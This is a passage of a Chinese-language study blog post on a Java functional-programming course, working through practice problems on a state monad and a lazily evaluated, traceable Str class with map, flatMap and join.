class=\"number\">1</span>, depth, maxDepth);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> FuncStat <span class=\"title function_\">incDepth</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FuncStat</span>(count, depth + <span class=\"number\">1</span>, Math.max(depth + <span class=\"number\">1</span>, maxDepth));</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> FuncStat <span class=\"title function_\">decDepth</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FuncStat</span>(count, depth - <span class=\"number\">1</span>, maxDepth);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"[count=\"</span> + count + <span class=\"string\">\" maxDepth=\"</span> + maxDepth + <span class=\"string\">\"]\"</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">ack</span><span class=\"params\">(<span class=\"type\">int</span> m, <span class=\"type\">int</span> n)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m == <span class=\"number\">0</span>) {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> n + <span class=\"number\">1</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n == <span class=\"number\">0</span>) {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ack(m - <span class=\"number\">1</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ack(m - <span class=\"number\">1</span>, ack(m, n - <span class=\"number\">1</span>));</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">StateM&lt;Integer, FuncState&gt; <span class=\"title function_\">ack</span><span class=\"params\">(<span class=\"type\">int</span> m, <span class=\"type\">int</span> n)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">do</span> {</span><br><span class=\"line\">        inc();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (m == <span class=\"number\">0</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> unit(n + <span class=\"number\">1</span>);</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (n == <span class=\"number\">0</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">do</span> {</span><br><span class=\"line\">                x &lt;- ack(m - <span class=\"number\">1</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> unit(x);</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">do</span> {</span><br><span class=\"line\">\t        x &lt;- ack(m, n - <span class=\"number\">1</span>);</span><br><span class=\"line\">    \t\ty &lt;- ack(m - <span class=\"number\">1</span>, x);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> unit(y);</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">StateM&lt;Nothing, FuncStat&gt; <span class=\"title function_\">incCount</span><span class=\"params\">()</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> StateM.&lt;FuncStat&gt;get().flatMap(x -&gt; StateM.&lt;FuncStat&gt;put(x.incCount()));</span><br><span class=\"line\">}</span><br><span class=\"line\">StateM&lt;Nothing, FuncStat&gt; <span class=\"title function_\">incDepth</span><span class=\"params\">()</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> StateM.&lt;FuncStat&gt;get().flatMap(x -&gt; StateM.&lt;FuncStat&gt;put(x.incDepth()));</span><br><span class=\"line\">}</span><br><span class=\"line\">StateM&lt;Nothing, FuncStat&gt; <span class=\"title function_\">decDepth</span><span class=\"params\">()</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> StateM.&lt;FuncStat&gt;get().flatMap(x -&gt; StateM.&lt;FuncStat&gt;put(x.decDepth()));</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">StateM&lt;Integer, FuncStat&gt; <span class=\"title function_\">ack</span><span class=\"params\">(<span class=\"type\">int</span> m, <span class=\"type\">int</span> n)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> incCount().flatMap(ignoreCount -&gt; </span><br><span class=\"line\">        incDepth().flatMap(ignoreDepth -&gt; {</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (m == <span class=\"number\">0</span>) {</span><br><span class=\"line\">                <span class=\"keyword\">return</span> decDepth().flatMap(ignore -&gt; StateM.unit(n + <span class=\"number\">1</span>));</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (n == <span class=\"number\">0</span>) {</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ack(m - <span class=\"number\">1</span>, <span class=\"number\">1</span>).flatMap(result -&gt; </span><br><span class=\"line\">                    decDepth().flatMap(ignore -&gt; StateM.unit(result))</span><br><span class=\"line\">                );</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ack(m, n - <span class=\"number\">1</span>).flatMap(tempResult -&gt; </span><br><span class=\"line\">                ack(m - <span class=\"number\">1</span>, tempResult).flatMap(result -&gt; </span><br><span class=\"line\">                    decDepth().flatMap(ignore -&gt; StateM.unit(result))</span><br><span class=\"line\">                )</span><br><span class=\"line\">            );</span><br><span class=\"line\">        })</span><br><span class=\"line\">    );</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h1 id=\"练习-ay2324-semester-1-stringable\">练习 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ydXNzZWxsZGFzaDMzMi5naXRodWIuaW8vQ1MyMDMwL1BBL1BBMi8yMzEwL1BBMl8yMzEwLmh0bWw=\">AY23/24\nSemester 1: Stringable<i class=\"fa fa-external-link-alt\"></i></span></h1>\n<p>https://russelldash332.github.io/CS2030/PA/PA2/2310/PA2_2310.html</p>\n<p>同样的，题面很长，可以不细看。</p>\n<h2 id=\"level-1-1\">Level 1</h2>\n<p>Str 类</p>\n<ul>\n<li>of，输入 String，返回 Str</li>\n<li>run，输入 Consumer，返回 void</li>\n<li>print，run的一个封装</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Consumer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Str</span> {</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> String str;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"title function_\">Str</span><span class=\"params\">(String s)</span> {</span><br><span class=\"line\">        str = s;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Str <span class=\"title function_\">of</span><span class=\"params\">(String s)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Str</span>(s);</span><br><span class=\"line\">    }   </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">(Consumer&lt;String&gt; action)</span> {</span><br><span class=\"line\">        action.accept(<span class=\"built_in\">this</span>.str);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">print</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.run(x -&gt; System.out.println(x));</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-2-1\">Level 2</h2>\n<p>在 Str 里实现 map 和 flatMap</p>\n<p>map：</p>\n<ul>\n<li>输入参数 Funcion&lt;String, String&gt; mapper;</li>\n<li>返回值：Str，Str.of(mapper返回值)</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Str <span class=\"title function_\">map</span><span class=\"params\">(Function&lt;String, String&gt; mapper)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Str.of(mapper.apply(<span class=\"built_in\">this</span>.str));</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>flatMap:</p>\n<ul>\n<li>输入参数：Function&lt;String, Str&gt;</li>\n<li>返回值：Str，就是mapper返回值</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Str <span class=\"title function_\">flatMap</span><span class=\"params\">(Function&lt;String, Str&gt; mapper)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> mapper.apply(<span class=\"built_in\">this</span>.str);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>实现 join</p>\n<ul>\n<li>输入参数：String | Str</li>\n<li>返回值，新的 Str</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Str <span class=\"title function_\">join</span><span class=\"params\">(Str str)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str.map(s -&gt; <span class=\"built_in\">this</span>.str + s);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> Str <span class=\"title function_\">join</span><span class=\"params\">(String str)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Str.of(<span class=\"built_in\">this</span>.str + str);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-3-1\">Level 3</h2>\n<p>重写一个 of，实现延迟计算。</p>\n<p>输入参数：Supplier</p>\n<p>返回值：Str</p>\n<p>增加一个 Supplier 的成员变量。</p>\n<p>得重新写之前的所有函数，把所有直接计算的地方改成传一个 supplier</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> org.example;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Consumer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Function;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Supplier;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Str</span> {</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Supplier&lt;String&gt; supplier;</span><br><span class=\"line\"></span><br><span class=\"line\">    Str(Supplier&lt;String&gt; supplier) {</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.supplier = supplier;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Str <span class=\"title function_\">of</span><span class=\"params\">(String str)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Str</span>(() -&gt; str);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Str <span class=\"title function_\">of</span><span class=\"params\">(Supplier&lt;String&gt; supplier)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Str</span>(supplier);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String <span class=\"title function_\">getStr</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> supplier.get();</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">(Consumer&lt;String&gt; action)</span> {</span><br><span class=\"line\">        action.accept(<span class=\"built_in\">this</span>.getStr());</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">print</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.run(x -&gt; System.out.println(x));</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Str <span class=\"title function_\">map</span><span class=\"params\">(Function&lt;String, String&gt; mapper)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Str.of(() -&gt; mapper.apply(<span class=\"built_in\">this</span>.getStr()));</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Str <span class=\"title function_\">flatMap</span><span class=\"params\">(Function&lt;String, Str&gt; mapper)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Str.of(() -&gt; mapper.apply(<span class=\"built_in\">this</span>.getStr()).getStr());</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Str <span class=\"title function_\">join</span><span class=\"params\">(Str other)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.flatMap(s1 -&gt; other.map(s2 -&gt; s1 + s2));</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Str <span class=\"title function_\">join</span><span class=\"params\">(String other)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.map(s -&gt; s + other);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-4-1\">Level 4</h2>\n<p>重点在看底下的解释，这里让我发现前面的 <code>join</code>\n实现不太对。</p>\n<p><img src=\"/CS2030/2024-11-02-%E6%96%B0%E5%8A%A0%E5%9D%A1%E5%9B%BD%E7%AB%8B-CS2030-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20241105215810800.png\" alt=\"image-20241105215810800\" style=\"zoom:50%;\"></p>\n<p>第一个 <code>join</code> 调用了 <code>flatMap</code>\n，<code>flatMap</code> 又调用了 <code>map</code> ，<code>map</code>\n又调用了 <code>Str.of</code></p>\n<p>所以修改一下这几个函数的实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Str <span class=\"title function_\">map</span><span class=\"params\">(Function&lt;String, String&gt; mapper)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Str.of(() -&gt; mapper.apply(<span class=\"built_in\">this</span>.getStr()));</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> Str <span class=\"title function_\">flatMap</span><span class=\"params\">(Function&lt;String, Str&gt; mapper)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Str.of(() -&gt; mapper.apply(<span class=\"built_in\">this</span>.getStr()).getStr());</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> Str <span class=\"title function_\">join</span><span class=\"params\">(Str other)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.flatMap(s1 -&gt; other.map(s2 -&gt; s1 + s2));</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> Str <span class=\"title function_\">join</span><span class=\"params\">(String other)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.map(s -&gt; s + other);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>这里其实就是常见的 <code>map</code> <code>flatMap</code>\n的实现方法，可以记一下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">外部类型 map(Funcion&lt;内部类型, 内部类型&gt; mapper) {</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">new</span> 外部类型(mapper.apply(内部数据));</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">外部类型 flatMap(Funcion&lt;内部类型, 外部类型&gt; mapper) {</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">new</span> 外部类型(mapper.apply(内部数据).get内部数据());</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">外部类型 join(外部类型 other) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> flatMap(a -&gt; other.map(b -&gt; a + b));</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">外部类型 join(内部类型 other) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> map(a -&gt; a + other);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>考试的时候遇到需要写这几个函数的时候，直接用这个模板。</p>\n<p>检验一下上一题中的 <code>flatMap</code>\n，有泛型看起来很不一样，实际上还是一样的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这里的内部类型就是 T，外部类型就是 U</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> &lt;U&gt; StateM&lt;U, S&gt; <span class=\"title function_\">flatMap</span><span class=\"params\">(Function&lt;T, StateM&lt;U, S&gt;&gt; mapper)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StateM</span>&lt;U, S&gt; <span class=\"comment\">// 构造新的外部类型</span></span><br><span class=\"line\">        (s -&gt; { <span class=\"comment\">// 因为StateM的构造函数接受的只能是函数，是延迟计算的，所以传进去的是lambda函数</span></span><br><span class=\"line\">        Pair&lt;T, S&gt; pair = <span class=\"built_in\">this</span>.accept(s);   <span class=\"comment\">// 取出 T，就是pair.first()内部数据</span></span><br><span class=\"line\">        StateM&lt;U, S&gt; state = mapper.apply(pair.first()); <span class=\"comment\">// 应用 mapper</span></span><br><span class=\"line\">        Pair&lt;U, S&gt; newPair = state.accept(pair.second()); <span class=\"comment\">// 函数的返回值一定是 Pair&lt;U, S&gt;，打个包</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> newPair;</span><br><span class=\"line\">    });</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>然后实现一下 trace：</p>\n<p>再注意到一个细节，System.out.println 的输出是夹在 trace\n输出中间的，所以 trace 中应该是直接输出，而不是先保存再输出。</p>\n<figure>\n<img src=\"/CS2030/2024-11-02-%E6%96%B0%E5%8A%A0%E5%9D%A1%E5%9B%BD%E7%AB%8B-CS2030-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20241105223035806.png\" alt=\"image-20241105223035806\">\n<figcaption aria-hidden=\"true\">image-20241105223035806</figcaption>\n</figure>\n<p>这题想了很久很久……直到看见 Level 5 的提示，告诉我可以设置 trace\n的参数，我才知道 supplier\n的类型原来是允许修改的……心好累，不想写解释了，代码应该能看懂的……</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> org.example;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Consumer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Function;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Supplier;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Str</span> {</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Function&lt;Boolean, String&gt; supplier;</span><br><span class=\"line\"></span><br><span class=\"line\">    Str(Function&lt;Boolean, String&gt; supplier) {</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.supplier = supplier;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Str <span class=\"title function_\">of</span><span class=\"params\">(String str)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Str</span>(tracer -&gt; {</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (tracer) {</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"traced Str: \"</span> + str);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> str;</span><br><span class=\"line\">        });</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Str <span class=\"title function_\">of</span><span class=\"params\">(Supplier&lt;String&gt; supplier)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Str</span>(tracer -&gt; {</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> supplier.get();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (tracer) {</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"traced Str: \"</span> + result);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">        });</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    String <span class=\"title function_\">getStr</span><span class=\"params\">(<span class=\"type\">boolean</span> tracer)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> supplier.apply(tracer);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">(Consumer&lt;String&gt; action)</span> {</span><br><span class=\"line\">        action.accept(<span class=\"built_in\">this</span>.getStr(<span class=\"literal\">false</span>));</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">print</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.run(x -&gt; System.out.println(x));</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Str <span class=\"title function_\">map</span><span class=\"params\">(Function&lt;String, String&gt; mapper)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Str</span>(tracer -&gt; {</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">str</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getStr(tracer);</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> mapper.apply(str);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (tracer) {</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"traced map: \"</span> + result);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">        });</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Str <span class=\"title function_\">flatMap</span><span class=\"params\">(Function&lt;String, Str&gt; mapper)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Str</span>(tracer -&gt; {</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">str</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getStr(tracer);</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> mapper.apply(str).getStr(tracer);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (tracer) {</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"traced flatMap: \"</span> + result);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">        });</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Str <span class=\"title function_\">join</span><span class=\"params\">(Str other)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.flatMap(s1 -&gt; other.map(s2 -&gt; s1 + s2));</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Str <span class=\"title function_\">join</span><span class=\"params\">(String other)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.map(s -&gt; s + other);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">trace</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getStr(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        System.out.println(result);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-5-1\">Level 5</h2>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> org.example;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Consumer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Function;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Supplier;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Str</span> {</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Function&lt;Consumer&lt;String&gt;, String&gt; supplier;</span><br><span class=\"line\"></span><br><span class=\"line\">    Str(Function&lt;Consumer&lt;String&gt;, String&gt; supplier) {</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.supplier = supplier;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Str <span class=\"title function_\">of</span><span class=\"params\">(String str)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Str</span>(tracer -&gt; {</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (tracer != <span class=\"literal\">null</span>) {</span><br><span class=\"line\">                tracer.accept(<span class=\"string\">\"traced Str: \"</span> + str);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> str;</span><br><span class=\"line\">        });</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Str <span class=\"title function_\">of</span><span class=\"params\">(Supplier&lt;String&gt; supplier)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Str</span>(tracer -&gt; {</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> supplier.get();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (tracer != <span class=\"literal\">null</span>) {</span><br><span class=\"line\">                tracer.accept(<span class=\"string\">\"traced Str: \"</span> + result);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">        });</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    String <span class=\"title function_\">getStr</span><span class=\"params\">(Consumer&lt;String&gt; tracer)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> supplier.apply(tracer);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    String <span class=\"title function_\">getStr</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> getStr(<span class=\"literal\">null</span>);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">(Consumer&lt;String&gt; action)</span> {</span><br><span class=\"line\">        action.accept(<span class=\"built_in\">this</span>.getStr());</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">print</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.run(x -&gt; System.out.println(x));</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Str <span class=\"title function_\">map</span><span class=\"params\">(Function&lt;String, String&gt; mapper)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Str</span>(tracer -&gt; {</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">str</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getStr(tracer);</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> 